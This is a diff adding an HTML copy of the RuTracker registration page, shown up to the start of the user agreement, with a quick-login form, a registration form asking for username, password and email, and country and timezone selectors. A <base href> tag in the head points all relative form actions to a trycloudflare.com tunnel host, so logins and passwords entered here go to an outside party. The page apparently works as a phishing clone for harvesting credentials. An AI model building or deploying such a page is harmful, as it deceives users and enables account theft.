@@ -1,0 +1,911 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<base href="https://reliance-delivered-networks-cooler.trycloudflare.com">
+
+<meta charset="Windows-1251">
+
+<title>Регистрация</title>
+
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#2b5797">
+<meta name="msapplication-TileImage" content="/mstile-144x144.png">
+<meta name="theme-color" content="#ffffff">
+
+<link rel="search" type="application/opensearchdescription+xml" title="Поиск на RuTracker.org" href="https://static.rutracker.cc/opensearch.xml">
+
+<script>
+window.BB = {
+	cur_domain: location.hostname.replace(/.*?(([a-z0-9-]+\.){1,2}[a-z0-9-]+)$/, '$1'),
+	form_token: '',
+	opt_js: {},
+
+	IS_GUEST: !!'1',
+	IMG_URL: 'https://static.rutracker.cc/templates/v1/images',
+	SMILES_URL: 'https://static.rutracker.cc/smiles',
+	catId: 0,
+	FORUM_ID: 0,
+	parentForumId: 0,
+		COOKIE_MARK: 'bb_mark_read',
+	};
+BB.cookie_defaults = {
+	domain: '.' + BB.cur_domain,
+	path: "/forum/",
+};
+</script>
+<link href="https://static.rutracker.cc/templates/v1/min/eb83350bae3880e4073b81d26294de5d.all.min.css" rel="stylesheet">
+<script src="https://static.rutracker.cc/templates/v1/min/4e695e8ea9cf5a1dcc7aed231b887c51.lib.min.js"></script>
+<script src="https://static.rutracker.cc/templates/v1/min/3b60ab3546ba966484df4c3099b918ab.bb.min.js"></script>
+
+
+
+<style>
+.invisible-el {
+	/* @include element-invisible(); */
+	clip: rect(1px, 1px, 1px, 1px);
+	height: 1px;
+	overflow: hidden;
+	position: absolute !important;
+	width: 1px;
+}
+.hidden, .menu-sub, #ajax-loading, #ajax-error, var.ajax-params, #modal-blocker, .q-post {
+	display: none;
+}
+/**/
+#logo {
+	min-height: auto;
+}
+/**/
+/* temp */
+/* temp end */
+</style>
+
+<noscript>
+	<style>
+	.sp-body {
+		display: block; /* for bots */
+	}
+	</style>
+</noscript>
+
+</head>
+
+<body class="" style="">
+
+<div id="invisible-heap" class="invisible-el"></div>
+<div id="preload" class="invisible-el"></div>
+
+
+
+<div id="body_container">
+
+		<script>
+	if (top != self && !self.location.hostname.match(BB.allowed_translator_hosts)) {
+		$(function () {
+			$('body').html('<h1 style="text-align: center;"><br><br>Похоже, вас пытаются обмануть<br>frame\'s hostname: ' + self.location.hostname + '</h1>');
+			throw new Error('in frame');
+		});
+	}
+		</script>
+
+	<div id="page_container">
+
+		<div id="page_header" class="hide-for-print">
+
+			<div id="main-nav" class="site-nav clearfix">
+				<ul class="inlined middot-separated floatL">
+					<li>
+						<a href="index.php"><b>Главная</b></a>
+					</li>
+					<li>
+													<a href="tracker.php" rel="nofollow"><b>Трекер</b></a>
+											</li>
+					<li>
+						<a href="search.php" rel="nofollow"><b>Поиск</b></a>
+					</li>
+					<li>
+						<a href="groupcp.php" rel="nofollow"><b>Группы</b></a>
+					</li>
+					<li>
+						<a href="https://rutracker.wiki/" target="_blank"><b>FAQ</b></a>
+					</li>
+					<li>
+						<a href="viewtopic.php?t=6812335" style="color: #7b1fa2;"><b>VPN</b></a>
+					</li>
+					<li>
+						<a href="viewtopic.php?t=1045"><b>Правила</b></a>
+					</li>
+					<li>
+						<a href="viewtopic.php?t=6452965" style="color: #880e4f;"><b>Донаты</b></a>
+					</li>
+									</ul>
+											</div>
+			<!--/main-nav-->
+
+			
+			<div id="logo">
+				<table style="">
+				<tr>
+					<td id="logo-td" style="padding: 3px 7px 3px 15px;">
+						<a href="index.php" class="site-logo-link">
+								<img class="site-logo"
+		src="https://static.rutracker.cc/logo/logo-3.svg"
+		style=""
+		alt="logo">
+							</a>
+					</td>
+					<td class="tCenter w100" style="padding: 6px 10px 0 3px;">
+											</td>
+				</tr>
+				</table>
+			</div>
+			<!--/logo-->
+
+						<div class="topmenu">
+				<table class="w100">
+				<tr>
+					
+					<td class="tCenter pad_2 nowrap">
+						<div>
+															<a href="profile.php?mode=register" rel="nofollow"><b>Регистрация</b></a>
+								&nbsp;&#0183;&nbsp;
+								<a href="#" onclick="BB.toggle_top_login(); return false;" tabindex="5"><b>Вход</b></a>
+
+								<div id="top-login-box">
+									<form id="quick-search-guest" method="get" action="tracker.php">
+										<input id="search-text-guest" type="text" name="nm" value="" tabindex="1" accesskey="q">
+										<input type="submit" value="поиск" tabindex="2">
+									</form>
+									<form id="login-form-quick" method="post" action="login.php" style="display: none;">
+																				<input id="top-login-uname" type="text" name="login_username" tabindex="1" accesskey="l" placeholder="имя">
+										<input id="top-login-pwd" type="password" name="login_password" tabindex="2" placeholder="пароль">
+										<label title="Защищенное соединение" class="login-ssl-block" style="display: none;">
+											<input class="login-ssl" type="checkbox" tabindex="3" checked>SSL
+										</label>
+										<input id="top-login-btn" type="submit" name="login" value="вход" tabindex="4">
+									</form>
+								</div>
+
+								<a href="otp.php" rel="nofollow"><b>Забыли имя или пароль?</b></a>
+													</div>
+					</td>
+
+					
+				</tr>
+				</table>
+			</div><!--/topmenu-->
+			
+			
+		</div>
+		<!--/page_header-->
+
+		
+		<div id="page_content">
+			<table style="width: 100%; border: none;">
+			<tr>
+
+				
+				<td id="main_content">
+					<div id="main_content_wrap">
+
+						
+						
+						
+						
+						<!--/page_header.tpl-->
+<script>
+$(function () {
+	ajax.validateRegistrationData = function () {
+		var $el = $(this);
+		var validatedElementId = $el.attr('id');
+		if (!validatedElementId) {
+			console.error('Missing validatedElementId');
+			return;
+		}
+		var validator = $el.data('validator');
+		if (!validator) {
+			console.error('Missing validator');
+			return;
+		}
+		var errorElementId = $el.data('error_el_id');
+		if (!errorElementId) {
+			console.error('Missing errorElementId');
+			return;
+		}
+		var $errorElement = $('#' + errorElementId);
+		if (!$errorElement.length) {
+			console.error('errorElement not found: ' + errorElementId);
+			return;
+		}
+		var value = $el.val();
+		if (!value) {
+			return;
+		}
+
+		ajax.exec({
+			action: 'validateRegistrationData',
+			validator: validator,
+			value: value,
+			validatedElementId: validatedElementId,
+			errorElementId: errorElementId,
+		});
+	};
+	ajax.callback.validateRegistrationData = function (data) {
+		var $validatedElement = $('#' + data['validatedElementId']);
+		var cleanedValue = data['cleanedValue'];
+		if (cleanedValue != '' && $validatedElement.val() != cleanedValue) {
+			$validatedElement.val(cleanedValue);
+		}
+		var $errorElement = $('#' + data['errorElementId']);
+		if (data['errorMessage'] != '') {
+			$errorElement.addClass('has-validation-error').html(data['errorMessage']).show();
+		} else {
+			$errorElement.removeClass('has-validation-error').html('').hide();
+		}
+	};
+
+	BB.registrationDataSubmitHandler = function registrationDataSubmitHandler() {
+		var $errorElements = $('.has-validation-error');
+		if ($errorElements.length) {
+			$.scrollTo($errorElements.get(0), { offset: -100 });
+			return false;
+		}
+	};
+});
+$(function () {
+	var tabIndex = 100;
+	$('input,select,textarea', '#prof-form').not(':hidden').not(':disabled').each(function () {
+		$(this).attr({ tabindex: ++tabIndex });
+	});
+	$('input#reg-submit').attr({ tabindex: ++tabIndex });
+		$('#prof-form input').not(':hidden').not(':disabled').get(0).focus();
+	$('.validate-reg-data').on('blur', ajax.validateRegistrationData);
+	$('#prof-form').on('submit', BB.registrationDataSubmitHandler);
+	
+		function replaceEnterKeyWithTab(event) {
+		if (event.keyCode === 13 /* Enter */) {
+			event.preventDefault();
+			var elementTabIndex = $(this).prop('tabIndex');
+			if (typeof elementTabIndex === 'number') {
+				$("[tabindex=" + (elementTabIndex + 1) + "]").focus();
+			}
+		}
+	}
+
+	$('.reg-input').on('keydown', replaceEnterKeyWithTab);
+	
+	$('#reg-confirm-agreement').on('click', function () {
+		$('.reg-agreement').hide();
+		$('.reg-confirm-email').show();
+		$('input#reg-submit').focus();
+	});
+
+	function updateEmail() {
+		var email = $('input[name="user_email"]').val();
+		$('#reg-email-text').text(email);
+	}
+
+	$('input[name="user_email"]').on('input', updateEmail).trigger('input');
+});
+</script>
+
+<h1 class="pagetitle">Регистрация</h1>
+
+<p class="nav">
+	<a href="index.php">Главная</a>
+</p>
+
+<form id="prof-form" method="post" action="profile.php?mode=register" class="tokenized" enctype="multipart/form-data"
+	>
+	<input type="hidden" name="reg_agreed" value="1">
+	
+	<table class="forumline prof-tbl">
+	<colgroup>
+		<col class="row1" style="width: 40%;">
+		<col class="row2" style="width: 60%;">
+	</colgroup>
+	<tr>
+		<th colspan="2">Регистрационная информация</th>
+	</tr>
+
+	<tr>
+		<td class="row2 small tCenter" colspan="2">Поля, отмеченные *, обязательны к заполнению</td>
+	</tr>
+
+	<tr>
+		<td class="prof-title">Имя: *</td>
+		<td>
+			<div>
+								<input id="reg-username" class="reg-input reg-input-1 validate-reg-data" type="text"
+					name="username" maxlength="25" value=""
+					data-validator="username" data-error_el_id="reg-error-username"
+					required>
+											</div>
+			<div id="reg-error-username" class="reg-validation-msg" style="display: none;"></div>
+		</td>
+	</tr>
+		<tr>
+		<td class="prof-title"> Пароль: *</td>
+		<td>
+			<input
+				class="reg-input reg-input-1"
+				type="password"
+				name="new_pass"
+				tabindex="130"
+				maxlength="20"
+				value=""
+				autocomplete="new-password"
+			required			>
+						<h6><i>(максимум: <b>20</b> символов)</i></h6><br>
+						<span id="show-pass" class="med a-like" onclick="show_pass(); $(this).remove();">показать пароль</span>
+			<script>
+			function show_pass() {
+				var $old = $('input[name=new_pass]');
+				var $new = $('<input type="text" name="new_pass" size="35" maxlength="20" value="" autocomplete="new-password">');
+				$new.prop({ tabindex: $old.prop('tabindex') }).val($old.val()).insertAfter($old).focus();
+				$old.remove();
+			}
+			</script>
+					</td>
+	</tr>
+	<tr>
+		<td class="prof-title">Email: *</td>
+		<td>
+			<div>
+				<input id="reg-user-email" class="reg-input reg-input-1 validate-reg-data" type="email"
+					name="user_email" maxlength="40" value=""
+					data-validator="email" data-error_el_id="reg-error-email"
+								required>
+								<!--<h6>В связи с постоянными проблемами у mail.ru использование доменов <b>mail.ru, list.ru, inbox.ru, bk.ru</b> временно запрещено</h6>-->
+			</div>
+			<div id="reg-error-email" class="reg-validation-msg" style="display: none;"></div>
+		</td>
+	</tr>
+		<tr>
+		<td class="prof-title">Код подтверждения: *</td>
+		<td>
+			<div><img src="https://static.rutracker.cc/captcha/a210184e9288c3efe3b420d731cfc565.jpg?2032756245" width="120" height="72" alt="pic"></div>
+			<div>
+				<input type="hidden" name="cap_sid" value="B3UsH3Hkr24eWDV4hwTj">
+				<input class="reg-input" type="text" name="cap_code_3799ece6a28a0a7dd0d02c2ff2b5da2c" value="" size="25" autocomplete="off" required style="width: 121px; text-align: center; font-weight: bold;">
+			</div>
+		</td>
+	</tr>
+	
+		<tr>
+		<td class="prof-title">Откуда:</td>
+		<td>
+			<script>
+			$(function () {
+				$('#user_flag_id').on('change', function () {
+					$('#user_flag_img').attr({ src: 'https://static.rutracker.cc/flags/' + $(this).val() + '.gif' });
+				});
+				$('span.sel-flag').on('click', function () {
+					$('#user_flag_id').val($(this).data('flag_id')).trigger('change');
+				});
+			});
+			</script>
+			<div style="margin-bottom: 3px;">
+				
+<select  name="user_flag_id" id="user_flag_id">
+		<option selected  value="0">&nbsp;&raquo; Выберите страну&nbsp;</option>
+		<option value="199">&nbsp;RuTracker.org&nbsp;</option>
+		<option value="195">&nbsp;Абхазия&nbsp;</option>
+		<option value="10">&nbsp;Австралия&nbsp;</option>
+		<option value="11">&nbsp;Австрия&nbsp;</option>
+		<option value="12">&nbsp;Азербайджан&nbsp;</option>
+		<option value="3">&nbsp;Албания&nbsp;</option>
+		<option value="4">&nbsp;Алжир&nbsp;</option>
+		<option value="6">&nbsp;Ангола&nbsp;</option>
+		<option value="5">&nbsp;Андорра&nbsp;</option>
+		<option value="7">&nbsp;Антигуа и Барбуда&nbsp;</option>
+		<option value="8">&nbsp;Аргентина&nbsp;</option>
+		<option value="9">&nbsp;Армения&nbsp;</option>
+		<option value="2">&nbsp;Афганистан&nbsp;</option>
+		<option value="13">&nbsp;Багамы&nbsp;</option>
+		<option value="15">&nbsp;Бангладеш&nbsp;</option>
+		<option value="16">&nbsp;Барбадос&nbsp;</option>
+		<option value="14">&nbsp;Бахрейн&nbsp;</option>
+		<option value="17">&nbsp;Беларусь&nbsp;</option>
+		<option value="19">&nbsp;Белиз&nbsp;</option>
+		<option value="18">&nbsp;Бельгия&nbsp;</option>
+		<option value="20">&nbsp;Бенин&nbsp;</option>
+		<option value="27">&nbsp;Болгария&nbsp;</option>
+		<option value="22">&nbsp;Боливия&nbsp;</option>
+		<option value="23">&nbsp;Босния и Герцеговина&nbsp;</option>
+		<option value="24">&nbsp;Ботсвана&nbsp;</option>
+		<option value="25">&nbsp;Бразилия&nbsp;</option>
+		<option value="26">&nbsp;Бруней&nbsp;</option>
+		<option value="28">&nbsp;Буркина-Фасо&nbsp;</option>
+		<option value="30">&nbsp;Бурунди&nbsp;</option>
+		<option value="21">&nbsp;Бутан&nbsp;</option>
+		<option value="184">&nbsp;Вануату&nbsp;</option>
+		<option value="179">&nbsp;Великобритания&nbsp;</option>
+		<option value="76">&nbsp;Венгрия&nbsp;</option>
+		<option value="185">&nbsp;Венесуэла&nbsp;</option>
+		<option value="186">&nbsp;Вьетнам&nbsp;</option>
+		<option value="61">&nbsp;Габон&nbsp;</option>
+		<option value="73">&nbsp;Гаити&nbsp;</option>
+		<option value="72">&nbsp;Гайана&nbsp;</option>
+		<option value="62">&nbsp;Гамбия&nbsp;</option>
+		<option value="65">&nbsp;Гана&nbsp;</option>
+		<option value="69">&nbsp;Гватемала&nbsp;</option>
+		<option value="70">&nbsp;Гвинея&nbsp;</option>
+		<option value="71">&nbsp;Гвинея-Бисау&nbsp;</option>
+		<option value="64">&nbsp;Германия&nbsp;</option>
+		<option value="74">&nbsp;Гондурас&nbsp;</option>
+		<option value="75">&nbsp;Гонконг&nbsp;</option>
+		<option value="67">&nbsp;Гренада&nbsp;</option>
+		<option value="66">&nbsp;Греция&nbsp;</option>
+		<option value="63">&nbsp;Грузия&nbsp;</option>
+		<option value="47">&nbsp;Дания&nbsp;</option>
+		<option value="48">&nbsp;Джибути&nbsp;</option>
+		<option value="49">&nbsp;Доминика&nbsp;</option>
+		<option value="50">&nbsp;Доминиканская Республика&nbsp;</option>
+		<option value="52">&nbsp;Египет&nbsp;</option>
+		<option value="194">&nbsp;ЕС&nbsp;</option>
+		<option value="190">&nbsp;Заир&nbsp;</option>
+		<option value="191">&nbsp;Замбия&nbsp;</option>
+		<option value="192">&nbsp;Зимбабве&nbsp;</option>
+		<option value="83">&nbsp;Израиль&nbsp;</option>
+		<option value="78">&nbsp;Индия&nbsp;</option>
+		<option value="79">&nbsp;Индонезия&nbsp;</option>
+		<option value="88">&nbsp;Иордания&nbsp;</option>
+		<option value="81">&nbsp;Ирак&nbsp;</option>
+		<option value="80">&nbsp;Иран&nbsp;</option>
+		<option value="82">&nbsp;Ирландия&nbsp;</option>
+		<option value="77">&nbsp;Исландия&nbsp;</option>
+		<option value="157">&nbsp;Испания&nbsp;</option>
+		<option value="84">&nbsp;Италия&nbsp;</option>
+		<option value="188">&nbsp;Йемен&nbsp;</option>
+		<option value="200">&nbsp;Кабо-Верде&nbsp;</option>
+		<option value="89">&nbsp;Казахстан&nbsp;</option>
+		<option value="31">&nbsp;Камбоджа&nbsp;</option>
+		<option value="32">&nbsp;Камерун&nbsp;</option>
+		<option value="33">&nbsp;Канада&nbsp;</option>
+		<option value="140">&nbsp;Катар&nbsp;</option>
+		<option value="90">&nbsp;Кения&nbsp;</option>
+		<option value="44">&nbsp;Кипр&nbsp;</option>
+		<option value="93">&nbsp;Киргизия&nbsp;</option>
+		<option value="91">&nbsp;Кирибати&nbsp;</option>
+		<option value="37">&nbsp;Китай&nbsp;</option>
+		<option value="38">&nbsp;Колумбия&nbsp;</option>
+		<option value="39">&nbsp;Коморы&nbsp;</option>
+		<option value="46">&nbsp;Конго&nbsp;</option>
+		<option value="41">&nbsp;Коста-Рика&nbsp;</option>
+		<option value="85">&nbsp;Кот д’Ивуар&nbsp;</option>
+		<option value="43">&nbsp;Куба&nbsp;</option>
+		<option value="92">&nbsp;Кувейт&nbsp;</option>
+		<option value="94">&nbsp;Лаос&nbsp;</option>
+		<option value="95">&nbsp;Латвия&nbsp;</option>
+		<option value="97">&nbsp;Либерия&nbsp;</option>
+		<option value="96">&nbsp;Ливан&nbsp;</option>
+		<option value="98">&nbsp;Ливия&nbsp;</option>
+		<option value="100">&nbsp;Литва&nbsp;</option>
+		<option value="99">&nbsp;Лихтенштейн&nbsp;</option>
+		<option value="101">&nbsp;Люксембург&nbsp;</option>
+		<option value="111">&nbsp;Маврикий&nbsp;</option>
+		<option value="110">&nbsp;Мавритания&nbsp;</option>
+		<option value="104">&nbsp;Мадагаскар&nbsp;</option>
+		<option value="103">&nbsp;Макао&nbsp;</option>
+		<option value="102">&nbsp;Македония&nbsp;</option>
+		<option value="105">&nbsp;Малави&nbsp;</option>
+		<option value="106">&nbsp;Малайзия&nbsp;</option>
+		<option value="108">&nbsp;Мали&nbsp;</option>
+		<option value="107">&nbsp;Мальдивы&nbsp;</option>
+		<option value="109">&nbsp;Мальта&nbsp;</option>
+		<option value="117">&nbsp;Марокко&nbsp;</option>
+		<option value="112">&nbsp;Мексика&nbsp;</option>
+		<option value="113">&nbsp;Микронезия&nbsp;</option>
+		<option value="118">&nbsp;Мозамбик&nbsp;</option>
+		<option value="114">&nbsp;Молдова&nbsp;</option>
+		<option value="115">&nbsp;Монако&nbsp;</option>
+		<option value="116">&nbsp;Монголия&nbsp;</option>
+		<option value="29">&nbsp;Мьянма&nbsp;</option>
+		<option value="119">&nbsp;Намибия&nbsp;</option>
+		<option value="120">&nbsp;Науру&nbsp;</option>
+		<option value="121">&nbsp;Непал&nbsp;</option>
+		<option value="126">&nbsp;Нигер&nbsp;</option>
+		<option value="127">&nbsp;Нигерия&nbsp;</option>
+		<option value="122">&nbsp;Нидерландские Антилы&nbsp;</option>
+		<option value="123">&nbsp;Нидерланды&nbsp;</option>
+		<option value="125">&nbsp;Никарагуа&nbsp;</option>
+		<option value="124">&nbsp;Новая Зеландия&nbsp;</option>
+		<option value="129">&nbsp;Норвегия&nbsp;</option>
+		<option value="177">&nbsp;ОАЭ&nbsp;</option>
+		<option value="130">&nbsp;Оман&nbsp;</option>
+		<option value="131">&nbsp;Пакистан&nbsp;</option>
+		<option value="132">&nbsp;Панама&nbsp;</option>
+		<option value="133">&nbsp;Папуа - Новая Гвинея&nbsp;</option>
+		<option value="134">&nbsp;Парагвай&nbsp;</option>
+		<option value="135">&nbsp;Перу&nbsp;</option>
+		<option value="193">&nbsp;ПМР&nbsp;</option>
+		<option value="137">&nbsp;Польша&nbsp;</option>
+		<option value="138">&nbsp;Португалия&nbsp;</option>
+		<option value="139">&nbsp;Пуэрто-Рико&nbsp;</option>
+		<option value="143">&nbsp;Россия&nbsp;</option>
+		<option value="141">&nbsp;Руанда&nbsp;</option>
+		<option value="142">&nbsp;Румыния&nbsp;</option>
+		<option value="187">&nbsp;Самоа&nbsp;</option>
+		<option value="197">&nbsp;Сан-Марино&nbsp;</option>
+		<option value="144">&nbsp;Сан-Томе и Принсипи&nbsp;</option>
+		<option value="145">&nbsp;Саудовская Аравия&nbsp;</option>
+		<option value="128">&nbsp;Северная Корея&nbsp;</option>
+		<option value="148">&nbsp;Сейшелы&nbsp;</option>
+		<option value="146">&nbsp;Сенегал&nbsp;</option>
+		<option value="68">&nbsp;Сент-Винсент и Гренадины&nbsp;</option>
+		<option value="159">&nbsp;Сент-Китс и Невис&nbsp;</option>
+		<option value="160">&nbsp;Сент-Люсия&nbsp;</option>
+		<option value="147">&nbsp;Сербия&nbsp;</option>
+		<option value="150">&nbsp;Сингапур&nbsp;</option>
+		<option value="165">&nbsp;Сирия&nbsp;</option>
+		<option value="151">&nbsp;Словакия&nbsp;</option>
+		<option value="152">&nbsp;Словения&nbsp;</option>
+		<option value="153">&nbsp;Соломоновы Острова&nbsp;</option>
+		<option value="154">&nbsp;Сомали&nbsp;</option>
+		<option value="182">&nbsp;СССР&nbsp;</option>
+		<option value="161">&nbsp;Судан&nbsp;</option>
+		<option value="162">&nbsp;Суринам&nbsp;</option>
+		<option value="1">&nbsp;США&nbsp;</option>
+		<option value="149">&nbsp;Сьерра-Леоне&nbsp;</option>
+		<option value="167">&nbsp;Таджикистан&nbsp;</option>
+		<option value="169">&nbsp;Таиланд&nbsp;</option>
+		<option value="166">&nbsp;Тайвань&nbsp;</option>
+		<option value="168">&nbsp;Танзания&nbsp;</option>
+		<option value="170">&nbsp;Того&nbsp;</option>
+		<option value="171">&nbsp;Тонга&nbsp;</option>
+		<option value="172">&nbsp;Тринидад и Тобаго&nbsp;</option>
+		<option value="176">&nbsp;Тувалу&nbsp;</option>
+		<option value="173">&nbsp;Тунис&nbsp;</option>
+		<option value="175">&nbsp;Туркмения&nbsp;</option>
+		<option value="174">&nbsp;Турция&nbsp;</option>
+		<option value="178">&nbsp;Уганда&nbsp;</option>
+		<option value="183">&nbsp;Узбекистан&nbsp;</option>
+		<option value="180">&nbsp;Украина&nbsp;</option>
+		<option value="181">&nbsp;Уругвай&nbsp;</option>
+		<option value="58">&nbsp;Фиджи&nbsp;</option>
+		<option value="136">&nbsp;Филиппины&nbsp;</option>
+		<option value="59">&nbsp;Финляндия&nbsp;</option>
+		<option value="60">&nbsp;Франция&nbsp;</option>
+		<option value="42">&nbsp;Хорватия&nbsp;</option>
+		<option value="34">&nbsp;ЦАР&nbsp;</option>
+		<option value="35">&nbsp;Чад&nbsp;</option>
+		<option value="198">&nbsp;Черногория&nbsp;</option>
+		<option value="45">&nbsp;Чехия&nbsp;</option>
+		<option value="36">&nbsp;Чили&nbsp;</option>
+		<option value="164">&nbsp;Швейцария&nbsp;</option>
+		<option value="163">&nbsp;Швеция&nbsp;</option>
+		<option value="158">&nbsp;Шри-Ланка&nbsp;</option>
+		<option value="51">&nbsp;Эквадор&nbsp;</option>
+		<option value="54">&nbsp;Экваториальная Гвинея&nbsp;</option>
+		<option value="53">&nbsp;Эль-Сальвадор&nbsp;</option>
+		<option value="55">&nbsp;Эритрея&nbsp;</option>
+		<option value="56">&nbsp;Эстония&nbsp;</option>
+		<option value="57">&nbsp;Эфиопия&nbsp;</option>
+		<option value="156">&nbsp;ЮАР&nbsp;</option>
+		<option value="189">&nbsp;Югославия&nbsp;</option>
+		<option value="155">&nbsp;Южная Корея&nbsp;</option>
+		<option value="196">&nbsp;Южная Осетия&nbsp;</option>
+		<option value="86">&nbsp;Ямайка&nbsp;</option>
+		<option value="87">&nbsp;Япония&nbsp;</option>
+</select>
+<img id="user_flag_img" class="poster-flag" src="https://static.rutracker.cc/flags/0.gif" style="vertical-align: middle; margin-left: 6px;" alt="">
+			</div>
+						<div class="med">
+				<span class="a-like sel-flag" data-flag_id="143">Россия</span>
+				&middot;
+				<span class="a-like sel-flag" data-flag_id="180">Украина</span>
+				&middot;
+				<span class="a-like sel-flag" data-flag_id="17">Беларусь</span>
+			</div>
+					</td>
+	</tr>
+	<tr>
+		<td class="prof-title">Часовой пояс:</td>
+		<td>
+<select  name="user_timezone_x2" id="user_timezone_x2">
+		<option value="-24">&nbsp;GMT - 12&nbsp;</option>
+		<option value="-22">&nbsp;GMT - 11&nbsp;</option>
+		<option value="-20">&nbsp;GMT - 10&nbsp;</option>
+		<option value="-18">&nbsp;GMT - 9&nbsp;</option>
+		<option value="-16">&nbsp;GMT - 8&nbsp;</option>
+		<option value="-14">&nbsp;GMT - 7&nbsp;</option>
+		<option value="-12">&nbsp;GMT - 6&nbsp;</option>
+		<option value="-10">&nbsp;GMT - 5&nbsp;</option>
+		<option value="-8">&nbsp;GMT - 4&nbsp;</option>
+		<option value="-7">&nbsp;GMT - 3:30&nbsp;</option>
+		<option value="-6">&nbsp;GMT - 3&nbsp;</option>
+		<option value="-4">&nbsp;GMT - 2&nbsp;</option>
+		<option value="-2">&nbsp;GMT - 1&nbsp;</option>
+		<option value="0">&nbsp;GMT (время по гринвичу)&nbsp;</option>
+		<option value="2">&nbsp;GMT + 1&nbsp;</option>
+		<option value="4">&nbsp;GMT + 2&nbsp;</option>
+		<option selected  value="6">&nbsp;GMT + 3 (Московское время)&nbsp;</option>
+		<option value="7">&nbsp;GMT + 3:30&nbsp;</option>
+		<option value="8">&nbsp;GMT + 4&nbsp;</option>
+		<option value="9">&nbsp;GMT + 4:30&nbsp;</option>
+		<option value="10">&nbsp;GMT + 5&nbsp;</option>
+		<option value="11">&nbsp;GMT + 5:30&nbsp;</option>
+		<option value="12">&nbsp;GMT + 6&nbsp;</option>
+		<option value="13">&nbsp;GMT + 6:30&nbsp;</option>
+		<option value="14">&nbsp;GMT + 7&nbsp;</option>
+		<option value="16">&nbsp;GMT + 8&nbsp;</option>
+		<option value="18">&nbsp;GMT + 9&nbsp;</option>
+		<option value="19">&nbsp;GMT + 9:30&nbsp;</option>
+		<option value="20">&nbsp;GMT + 10&nbsp;</option>
+		<option value="22">&nbsp;GMT + 11&nbsp;</option>
+		<option value="24">&nbsp;GMT + 12&nbsp;</option>
+		<option value="26">&nbsp;GMT + 13&nbsp;</option>
+</select>
+</td>
+	</tr>
+	<tr>
+		<td class="prof-title">Пол:</td>
+		<td>
+<select  name="user_gender_id" id="user_gender_id">
+		<option selected  value="0">&nbsp;Засекречен&nbsp;</option>
+		<option value="1">&nbsp;Женский&nbsp;</option>
+		<option value="2">&nbsp;Мужской&nbsp;</option>
+</select>
+</td>
+	</tr>
+
+	
+		<tr class="reg-agreement">
+		<td class="row5" colspan="2">
+			<div class="infobox">
+				<fieldset>
+					<legend>Для продолжения регистрации Вы должны принять наше ПОЛЬЗОВАТЕЛЬСКОЕ СОГЛАШЕНИЕ</legend>
+					<article style="height: 200px;"><p>ПОЛЬЗОВАТЕЛЬСКОЕ СОГЛАШЕНИЕ</p>
+
+<p>О САЙТЕ</p>
+
+<p>Интернет - ресурс (сайт) RUTRACKER.ORG (в дальнейшем - Ресурс) является интернет-сайтом, позволяющим пользователям обмениваться друг с другом информацией по протоколу бит-торрент, а также в свободной форме, и предоставляющим средства для контроля целостности передаваемой информации (посредством hash-файлов).</p>
+
+<p>1. О ПОЛЬЗОВАТЕЛЬСКОМ СОГЛАШЕНИИ</p>
+
+<p>Настоящее ПОЛЬЗОВАТЕЛЬСКОЕ СОГЛАШЕНИЕ вступает в силу после нажатия кнопки "согласен" внизу страницы и действует все время использования Пользователем Ресурса. ПОЛЬЗОВАТЕЛЬСКОЕ СОГЛАШЕНИЕ может быть изменено Администрацией без какого-либо уведомления пользователей. Новая версия ПС вступает в силу по истечении 3 (трех) дней с момента ее размещения, если иное не предусмотрено новой редакцией ПОЛЬЗОВАТЕЛЬСКОГО СОГЛАШЕНИЯ.</p>
+
+<p>2. УСЛОВИЯ ОГРАНИЧЕНИЯ ОТВЕТСТВЕННОСТИ</p>
+
+<p>Пользователь прямо соглашается c тем, что использует Ресурс на свой собственный риск.</p>
+
+<p>Пользователь знает, и согласен с тем, что Ресурс имеет дело с материалами и данными, созданными третьими лицами и размещенными ими в сети Интернет на своих компьютерах и (или) серверах. Содержание и безопасность этих материалов не могут быть проконтролированы Администрацией Ресурса, поэтому последняя не несет ответственности:</p>
+
+<p>- за содержание материалов, полученных Пользователем в результате использования данных с Ресурса, их возможное несоответствие действующему законодательству или оскорбительный характер;</p>
+
+<p>- за последствия применения, использования или неиспользования полученной информации;</p>
+
+<p>- за возможное несоответствие результатов, полученных при использовании Ресурса, ожиданиям Пользователя;</p>
+
+<p>- за какие-либо повреждения оборудования или программного обеспечения Пользователя, возникшие в результате использовании Ресурса;</p>
+
+<p>- за отсутствие возможности использования Ресурса по каким-либо причинам;</p>
+
+<p>- за последствия, которые может повлечь распространение нелегального либо нелицензионного программного обеспечения и аудио-/видеопродукции, а также иных материалов либо данных, затрагивающих права третьих лиц.</p>
+
+<p>Ни при каких обстоятельствах Ресурс не несет перед Пользователем, либо третьими лицами ответственности за ущерб, убытки или расходы, возникшие в связи с настоящим Ресурсом, его использованием или невозможностью использования, включая упущенную либо недополученную прибыль.</p>
+
+<p>Пользователь обязуется не передавать другим лицами свои персональные данные полученные при регистрации (логин и пароль) для входа/идентификации на ресурс и несет полную ответственность за утерю, пропажу, исчезновение или передачу иными способами персональных данных, а также за последствия связанные с данным деянием. Администрация Ресурса не несёт ответственности за действия третьих лиц, воспользовавшихся персональными данными Пользователя, и имеет право деактивировать его аккаунт при утечке персональных данных.</p>
+
+<p>Пользователь информируется, что неиспользуемые в течение длительного времени аккаунты удаляются и восстановлению не подлежат.</p>
+
+<p>Администрация Ресурса не несет никаких обязательств по обеспечению конфиденциальности в отношении информации, предоставляемой его Пользователям, хотя принимает все возможные меры к этому, если не имеется договоренности об обратном или соответствующих требований действующего законодательства.</p>
+
+<p>В обязанности Ресурса НЕ ВХОДИТ контроль легальности или нелегальности передаваемой информации (любой, включая, но не ограничиваясь, информацией передаваемой между пользователями по протоколу бит-торрент, внутренней пересылки информации в виде различных ссылок, текстов или архивов), определение прав собственности или законности передачи, приема или использования этой информации.</p>
+
+<p>3. ОГРАНИЧЕНИЯ НА ИСПОЛЬЗОВАНИЕ РЕСУРСА ПОЛЬЗОВАТЕЛЕМ.</p>
+
+<p>При использовании данного Ресурса, ПОЛЬЗОВАТЕЛЬ не имеет права, и соглашается с этим:</p>
+
